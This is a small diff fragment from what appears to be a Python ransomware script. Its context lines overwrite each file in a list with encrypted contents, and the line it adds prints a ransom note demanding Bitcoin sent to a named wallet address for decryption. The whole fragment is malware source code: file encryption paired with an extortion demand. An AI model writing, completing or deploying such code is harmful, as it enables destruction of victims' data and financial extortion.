@@ -33,4 +33,4 @@ for file in files:
     with open(file, "wb") as currFile:
         currFile.write(contents_encrypted)
 
-
+print('All of your files have been encrypted! Please send any amount of Bitcoin to bc1qnpdleg6j602d77460xaesnk8u3eqx4aclekv7v to decrypt.')
